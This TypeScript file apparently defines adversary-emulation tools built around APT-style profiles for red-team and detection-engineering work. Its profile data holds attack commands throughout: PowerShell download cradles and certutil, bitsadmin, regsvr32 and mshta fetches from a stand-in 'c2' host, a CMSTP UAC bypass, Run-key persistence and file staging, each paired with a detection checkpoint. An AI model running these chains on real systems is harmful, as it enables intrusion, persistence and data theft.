import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform, UnifiedLOLEntry } from "../schema/unified-entry.js";

// ━━━ Adversary Simulation Profiles ━━━

interface SimulationStep {
  phase: string;
  binary: string;
  attckId: string;
  command: string;
  description: string;
  expectedOutcome: string;
  detectionCheckpoint: string;
}

interface SimulationProfile {
  name: string;
  actor: string;
  description: string;
  difficulty: "beginner" | "intermediate" | "advanced";
  platforms: Platform[];
  objectives: string[];
  steps: SimulationStep[];
}

const SIMULATION_PROFILES: Map<string, SimulationProfile> = new Map([
  ["apt29_solartechnique", {
    name: "APT29 SolarWinds-Style",
    actor: "APT29",
    description: "Emulate APT29 post-compromise LOL technique chain: DLL sideload, encoded payloads, stealthy recon",
    difficulty: "advanced" as const,
    platforms: ["windows"] as Platform[],
    objectives: ["Defense evasion via signed binary proxy", "Encoded payload delivery", "Stealthy reconnaissance"],
    steps: [
      {
        phase: "Initial Execution",
        binary: "rundll32",
        attckId: "T1218.011",
        command: "rundll32.exe C:\\ProgramData\\test.dll,EntryPoint",
        description: "Execute DLL payload via rundll32 proxy execution",
        expectedOutcome: "DLL loaded and EntryPoint function executed",
        detectionCheckpoint: "Sysmon Event ID 1 (Process Create) with rundll32 loading non-standard DLL path",
      },
      {
        phase: "Payload Decode",
        binary: "certutil",
        attckId: "T1140",
        command: "certutil -decode C:\\ProgramData\\encoded.txt C:\\ProgramData\\payload.exe",
        description: "Decode base64-encoded payload using certutil",
        expectedOutcome: "Decoded binary written to disk",
        detectionCheckpoint: "Sysmon Event ID 11 (File Create) + certutil with -decode flag in command line",
      },
      {
        phase: "Reconnaissance",
        binary: "powershell",
        attckId: "T1059.001",
        command: "powershell -nop -w hidden -enc <BASE64_SCRIPT>",
        description: "Execute encoded PowerShell for system and network reconnaissance",
        expectedOutcome: "System information, network config, and domain data collected",
        detectionCheckpoint: "PowerShell ScriptBlock logging (Event ID 4104), encoded command flag detected",
      },
      {
        phase: "Persistence",
        binary: "reg",
        attckId: "T1547.001",
        command: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d C:\\ProgramData\\payload.exe /f",
        description: "Establish registry Run key persistence",
        expectedOutcome: "Payload set to execute on user logon",
        detectionCheckpoint: "Sysmon Event ID 13 (Registry Value Set) on Run key",
      },
    ],
  }],
  ["fin7_phishing", {
    name: "FIN7 Phishing Chain",
    actor: "FIN7",
    description: "Emulate FIN7 spearphishing attack chain using HTA, scripting hosts, and PowerShell",
    difficulty: "intermediate" as const,
    platforms: ["windows"] as Platform[],
    objectives: ["Initial access via HTA execution", "Script-based payload delivery", "Data staging"],
    steps: [
      {
        phase: "Initial Access",
        binary: "mshta",
        attckId: "T1218.005",
        command: "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -f C:\\temp\\stage1.ps1\"\", 0:close\")",
        description: "Execute HTA payload delivered via spearphishing attachment",
        expectedOutcome: "PowerShell stager launched via mshta proxy",
        detectionCheckpoint: "Sysmon Event ID 1: mshta.exe spawning powershell.exe",
      },
      {
        phase: "Payload Execution",
        binary: "wscript",
        attckId: "T1059.005",
        command: "wscript.exe C:\\Users\\Public\\update.vbs",
        description: "Execute VBScript dropper for second-stage payload",
        expectedOutcome: "VBScript executed, additional components downloaded",
        detectionCheckpoint: "Sysmon Event ID 1: wscript.exe execution + Event ID 3 (Network Connection)",
      },
      {
        phase: "C2 Setup",
        binary: "powershell",
        attckId: "T1059.001",
        command: "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://c2/beacon')\"",
        description: "Download and execute C2 beacon via PowerShell download cradle",
        expectedOutcome: "C2 beacon established with command channel active",
        detectionCheckpoint: "PowerShell Event ID 4104 + Sysmon Event ID 3 outbound connection",
      },
      {
        phase: "Data Staging",
        binary: "cmd",
        attckId: "T1059.003",
        command: "cmd /c dir /s /b C:\\Users\\*.xlsx C:\\Users\\*.docx > C:\\temp\\files.txt",
        description: "Enumerate and stage files of interest using cmd",
        expectedOutcome: "File listing created for exfiltration targets",
        detectionCheckpoint: "Sysmon Event ID 1: cmd.exe with recursive dir and file type filters",
      },
    ],
  }],
  ["lazarus_download", {
    name: "Lazarus Download Chain",
    actor: "Lazarus",
    description: "Emulate Lazarus group payload download and execution chain using certutil and bitsadmin",
    difficulty: "intermediate" as const,
    platforms: ["windows"] as Platform[],
    objectives: ["Payload download via trusted binaries", "Background transfer persistence", "Defense evasion"],
    steps: [
      {
        phase: "Download",
        binary: "certutil",
        attckId: "T1105",
        command: "certutil -urlcache -split -f http://c2/payload.exe C:\\ProgramData\\svchost.exe",
        description: "Download payload using certutil URL cache mechanism",
        expectedOutcome: "Payload downloaded and saved to disk with innocuous name",
        detectionCheckpoint: "Sysmon Event ID 1: certutil with -urlcache flag + Event ID 11 (File Create)",
      },
      {
        phase: "Background Transfer",
        binary: "bitsadmin",
        attckId: "T1197",
        command: "bitsadmin /transfer update /download /priority normal http://c2/stage2.dll C:\\ProgramData\\stage2.dll",
        description: "Use BITS job for resilient background download",
        expectedOutcome: "BITS job created and file downloaded in background",
        detectionCheckpoint: "BITS-Client Event Log (Event ID 59) + Sysmon Event ID 1: bitsadmin /transfer",
      },
      {
        phase: "Execution",
        binary: "rundll32",
        attckId: "T1218.011",
        command: "rundll32.exe C:\\ProgramData\\stage2.dll,DllMain",
        description: "Execute downloaded DLL payload via rundll32",
        expectedOutcome: "DLL loaded and malicious export function executed",
        detectionCheckpoint: "Sysmon Event ID 1: rundll32 loading DLL from ProgramData",
      },
      {
        phase: "Persistence",
        binary: "bitsadmin",
        attckId: "T1197",
        command: "bitsadmin /create /download persist && bitsadmin /addfile persist http://c2/beacon.exe C:\\ProgramData\\beacon.exe && bitsadmin /SetNotifyCmdLine persist C:\\ProgramData\\beacon.exe NULL && bitsadmin /resume persist",
        description: "Create persistent BITS job with SetNotifyCmdLine for re-execution",
        expectedOutcome: "BITS job configured to re-execute payload on completion",
        detectionCheckpoint: "BITS-Client logs + bitsadmin /SetNotifyCmdLine in command line",
      },
    ],
  }],
  ["turla_stealth", {
    name: "Turla Stealth Recon",
    actor: "Turla",
    description: "Emulate Turla stealthy reconnaissance and persistence using PowerShell and registry modification",
    difficulty: "advanced" as const,
    platforms: ["windows", "linux"] as Platform[],
    objectives: ["Stealthy system enumeration", "Registry-based persistence", "Covert data collection"],
    steps: [
      {
        phase: "Reconnaissance",
        binary: "cmd",
        attckId: "T1059.003",
        command: "cmd /c systeminfo && ipconfig /all && net user && net group \"Domain Admins\" /domain",
        description: "Comprehensive system and domain enumeration via cmd",
        expectedOutcome: "System info, network config, and domain data collected",
        detectionCheckpoint: "Sysmon Event ID 1: cmd.exe with chained recon commands",
      },
      {
        phase: "Data Collection",
        binary: "powershell",
        attckId: "T1059.001",
        command: "powershell -nop -w hidden -c \"Get-ChildItem -Recurse -Include *.doc,*.pdf,*.xls | Select FullName,Length | Export-Csv C:\\temp\\docs.csv\"",
        description: "Enumerate sensitive documents using PowerShell",
        expectedOutcome: "CSV listing of sensitive document paths and sizes",
        detectionCheckpoint: "PowerShell ScriptBlock logging: Get-ChildItem with sensitive extensions",
      },
      {
        phase: "Persistence",
        binary: "reg",
        attckId: "T1112",
        command: "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /d \"powershell -nop -w hidden -enc <PAYLOAD>\" /f",
        description: "Establish encoded PowerShell persistence via registry",
        expectedOutcome: "Encoded PowerShell payload set to execute at startup",
        detectionCheckpoint: "Sysmon Event ID 13: Registry Run key set with powershell -enc",
      },
    ],
  }],
  ["cobalt_awlbypass", {
    name: "Cobalt Group AWL Bypass",
    actor: "Cobalt Group",
    description: "Emulate Cobalt Group application whitelisting bypass chain using regsvr32, mshta, and cmstp",
    difficulty: "advanced" as const,
    platforms: ["windows"] as Platform[],
    objectives: ["AppLocker bypass", "UAC bypass", "Beacon deployment"],
    steps: [
      {
        phase: "AWL Bypass",
        binary: "regsvr32",
        attckId: "T1218.010",
        command: "regsvr32 /s /n /u /i:http://c2/file.sct scrobj.dll",
        description: "Squiblydoo: Use regsvr32 to execute remote SCT file bypassing AppLocker",
        expectedOutcome: "Remote SCT script fetched and executed in regsvr32 context",
        detectionCheckpoint: "Sysmon Event ID 1: regsvr32 with /i:http URL + Event ID 3 outbound",
      },
      {
        phase: "Secondary Execution",
        binary: "mshta",
        attckId: "T1218.005",
        command: "mshta http://c2/payload.hta",
        description: "Execute remote HTA payload via mshta",
        expectedOutcome: "HTA content downloaded and executed",
        detectionCheckpoint: "Sysmon Event ID 1: mshta with HTTP URL + Event ID 3 outbound connection",
      },
      {
        phase: "UAC Bypass",
        binary: "cmstp",
        attckId: "T1218.003",
        command: "cmstp /s /ns C:\\temp\\bypass.inf",
        description: "Use CMSTP with crafted INF file to bypass UAC",
        expectedOutcome: "Elevated execution achieved without UAC prompt",
        detectionCheckpoint: "Sysmon Event ID 1: cmstp.exe with /s flag + Event ID 12/13 (Registry)",
      },
      {
        phase: "Beacon Deploy",
        binary: "powershell",
        attckId: "T1059.001",
        command: "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')\"",
        description: "Deploy Cobalt Strike beacon via PowerShell download cradle",
        expectedOutcome: "Cobalt Strike beacon loaded in memory and C2 channel established",
        detectionCheckpoint: "PowerShell Event ID 4104 + Sysmon Event ID 3: outbound HTTPS connection",
      },
    ],
  }],
]);

// ━━━ Helper Functions ━━━

function deduplicateByBinary(entries: UnifiedLOLEntry[]): UnifiedLOLEntry[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    const key = `${e.binary}-${e.platform}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

function summarizeKbEntry(e: UnifiedLOLEntry): Record<string, unknown> {
  return {
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealthScore: e.stealthScore,
    attck: e.attckTechniques,
    commands: e.executionContexts.slice(0, 2).map(c => ({
      context: c.context,
      command: c.command,
    })),
  };
}

// ━━━ Tools ━━━

const sim_select_profile: ToolDef = {
  name: "sim_select_profile",
  description: "Select an adversary simulation profile and view its details (APT29, FIN7, Lazarus, Turla, Cobalt Group)",
  schema: {
    profile: z.string().describe("Simulation profile name or actor name (e.g. apt29_solartechnique, FIN7, Lazarus)"),
  },
  async execute(args: { profile: string }, ctx: ToolContext): Promise<ToolResult> {
    const lower = args.profile.toLowerCase();
    let sim: SimulationProfile | undefined;

    // Try exact key match first
    for (const [key, profile] of SIMULATION_PROFILES) {
      if (key.toLowerCase() === lower || profile.actor.toLowerCase() === lower || profile.name.toLowerCase().includes(lower)) {
        sim = profile;
        break;
      }
    }

    if (!sim) {
      const available = Array.from(SIMULATION_PROFILES.entries()).map(([k, v]) => `${k} (${v.actor})`).join(", ");
      return text(`Profile not found: "${args.profile}". Available: ${available}`);
    }

    return json({
      profile: {
        name: sim.name,
        actor: sim.actor,
        description: sim.description,
        difficulty: sim.difficulty,
        platforms: sim.platforms,
        objectives: sim.objectives,
        totalSteps: sim.steps.length,
      },
      phases: sim.steps.map(s => s.phase),
      binariesRequired: Array.from(new Set(sim.steps.map(s => s.binary))),
      attckCoverage: Array.from(new Set(sim.steps.map(s => s.attckId))),
    });
  },
};

const sim_generate_playbook: ToolDef = {
  name: "sim_generate_playbook",
  description: "Generate a step-by-step adversary emulation playbook using LOL binaries with KB-enriched commands",
  schema: {
    profile: z.string().describe("Simulation profile name or actor name"),
    platform: z.string().optional().describe("Target platform to filter KB entries (linux, windows, macos)"),
  },
  async execute(args: { profile: string; platform?: string }, ctx: ToolContext): Promise<ToolResult> {
    const lower = args.profile.toLowerCase();
    let sim: SimulationProfile | undefined;

    for (const [key, profile] of SIMULATION_PROFILES) {
      if (key.toLowerCase() === lower || profile.actor.toLowerCase() === lower || profile.name.toLowerCase().includes(lower)) {
        sim = profile;
        break;
      }
    }

    if (!sim) {
      const available = Array.from(SIMULATION_PROFILES.entries()).map(([k, v]) => `${k} (${v.actor})`).join(", ");
      return text(`Profile not found: "${args.profile}". Available: ${available}`);
    }

    const enrichedSteps = sim.steps.map((step, index) => {
      const kbEntries = ctx.knowledgeBase.lookupBinary(step.binary, args.platform as Platform);
      const attckEntries = ctx.knowledgeBase.searchByAttck(step.attckId, args.platform as Platform);
      const combined = deduplicateByBinary([...kbEntries, ...attckEntries]);

      return {
        stepNumber: index + 1,
        phase: step.phase,
        binary: step.binary,
        attckId: step.attckId,
        description: step.description,
        command: step.command,
        expectedOutcome: step.expectedOutcome,
        detectionCheckpoint: step.detectionCheckpoint,
        alternativeCommands: combined.slice(0, 3).flatMap(e =>
          e.executionContexts.slice(0, 2).map(c => ({
            command: c.command,
            context: c.context,
            result: c.result,
          })),
        ),
        kbMatches: combined.length,
      };
    });

    return json({
      playbook: {
        name: sim.name,
        actor: sim.actor,
        difficulty: sim.difficulty,
        platforms: sim.platforms,
        objectives: sim.objectives,
      },
      steps: enrichedSteps,
      summary: {
        totalSteps: enrichedSteps.length,
        uniqueBinaries: Array.from(new Set(sim.steps.map(s => s.binary))),
        uniqueAttckIds: Array.from(new Set(sim.steps.map(s => s.attckId))),
      },
    });
  },
};

const sim_validate_env: ToolDef = {
  name: "sim_validate_env",
  description: "Validate if an environment has the required binaries and conditions for a given adversary simulation profile",
  schema: {
    profile: z.string().describe("Simulation profile name or actor name"),
    environment_id: z.string().describe("Environment session ID from env_set"),
  },
  async execute(args: { profile: string; environment_id: string }, ctx: ToolContext): Promise<ToolResult> {
    const session = ctx.sessions.get(args.environment_id);
    if (!session) {
      return text(`Environment session "${args.environment_id}" not found. Use env_set first.`);
    }

    const lower = args.profile.toLowerCase();
    let sim: SimulationProfile | undefined;

    for (const [key, profile] of SIMULATION_PROFILES) {
      if (key.toLowerCase() === lower || profile.actor.toLowerCase() === lower || profile.name.toLowerCase().includes(lower)) {
        sim = profile;
        break;
      }
    }

    if (!sim) {
      const available = Array.from(SIMULATION_PROFILES.entries()).map(([k, v]) => `${k} (${v.actor})`).join(", ");
      return text(`Profile not found: "${args.profile}". Available: ${available}`);
    }

    const env = session.state;
    const installedLower = new Set(env.installedBinaries.map(b => b.toLowerCase()));
    const requiredBinaries = Array.from(new Set(sim.steps.map(s => s.binary)));

    const platformMatch = sim.platforms.includes(env.platform);
    const binaryValidation = requiredBinaries.map(b => ({
      binary: b,
      available: installedLower.has(b.toLowerCase()),
    }));

    const availableCount = binaryValidation.filter(b => b.available).length;
    const readiness = availableCount === requiredBinaries.length
      ? "ready"
      : availableCount > 0
        ? "partial"
        : "not_ready";

    return json({
      profile: sim.name,
      actor: sim.actor,
      environmentId: args.environment_id,
      validation: {
        platformMatch,
        environmentPlatform: env.platform,
        requiredPlatforms: sim.platforms,
        readiness,
        binaryValidation,
        availableBinaries: availableCount,
        totalRequired: requiredBinaries.length,
        edrDetected: env.edrDetected,
        edrWarning: env.edrDetected !== "none"
          ? `EDR detected (${env.edrDetected}): detection checkpoints will likely trigger alerts`
          : "No EDR detected",
      },
      stepsReadiness: sim.steps.map((s, i) => ({
        step: i + 1,
        phase: s.phase,
        binary: s.binary,
        binaryAvailable: installedLower.has(s.binary.toLowerCase()),
        feasible: installedLower.has(s.binary.toLowerCase()) && platformMatch,
      })),
    });
  },
};

const sim_execution_plan: ToolDef = {
  name: "sim_execution_plan",
  description: "Create a detailed execution plan with commands, expected outcomes, and detection checkpoints for adversary simulation",
  schema: {
    profile: z.string().describe("Simulation profile name or actor name"),
    environment_id: z.string().optional().describe("Optional environment session ID to validate binary availability"),
    include_detection: z.boolean().optional().describe("Include detection engineering checkpoints (default: true)"),
  },
  async execute(args: { profile: string; environment_id?: string; include_detection?: boolean }, ctx: ToolContext): Promise<ToolResult> {
    const lower = args.profile.toLowerCase();
    let sim: SimulationProfile | undefined;

    for (const [key, profile] of SIMULATION_PROFILES) {
      if (key.toLowerCase() === lower || profile.actor.toLowerCase() === lower || profile.name.toLowerCase().includes(lower)) {
        sim = profile;
        break;
      }
    }

    if (!sim) {
      const available = Array.from(SIMULATION_PROFILES.entries()).map(([k, v]) => `${k} (${v.actor})`).join(", ");
      return text(`Profile not found: "${args.profile}". Available: ${available}`);
    }

    const includeDetection = args.include_detection !== false;

    // Validate against environment if provided
    let envValidation: Record<string, unknown> | undefined;
    if (args.environment_id) {
      const session = ctx.sessions.get(args.environment_id);
      if (session) {
        const installedLower = new Set(session.state.installedBinaries.map(b => b.toLowerCase()));
        const required = Array.from(new Set(sim.steps.map(s => s.binary)));
        envValidation = {
          environmentId: args.environment_id,
          platform: session.state.platform,
          available: required.filter(b => installedLower.has(b.toLowerCase())),
          missing: required.filter(b => !installedLower.has(b.toLowerCase())),
          edrDetected: session.state.edrDetected,
        };
      }
    }

    const executionPlan = sim.steps.map((step, index) => {
      const kbEntries = ctx.knowledgeBase.lookupBinary(step.binary);
      const detection = kbEntries.length > 0 ? kbEntries[0].detection : null;

      const planStep: Record<string, unknown> = {
        stepNumber: index + 1,
        phase: step.phase,
        binary: step.binary,
        attckId: step.attckId,
        description: step.description,
        command: step.command,
        expectedOutcome: step.expectedOutcome,
      };

      if (includeDetection) {
        planStep.detectionCheckpoint = step.detectionCheckpoint;
        if (detection) {
          planStep.detectionCoverage = {
            edrCoverage: detection.edrCoverage,
            sigmaRules: detection.sigmaRules.slice(0, 3),
            sysmonEvents: detection.sysmonEvents,
            logSources: detection.logSources,
          };
        }
      }

      return planStep;
    });

    return json({
      executionPlan: {
        name: sim.name,
        actor: sim.actor,
        difficulty: sim.difficulty,
        platforms: sim.platforms,
        objectives: sim.objectives,
      },
      steps: executionPlan,
      environmentValidation: envValidation,
      summary: {
        totalSteps: executionPlan.length,
        estimatedPhases: Array.from(new Set(sim.steps.map(s => s.phase))),
        attckCoverage: Array.from(new Set(sim.steps.map(s => s.attckId))),
      },
    });
  },
};

export const adversarySimTools: ToolDef[] = [
  sim_select_profile,
  sim_generate_playbook,
  sim_validate_env,
  sim_execution_plan,
];
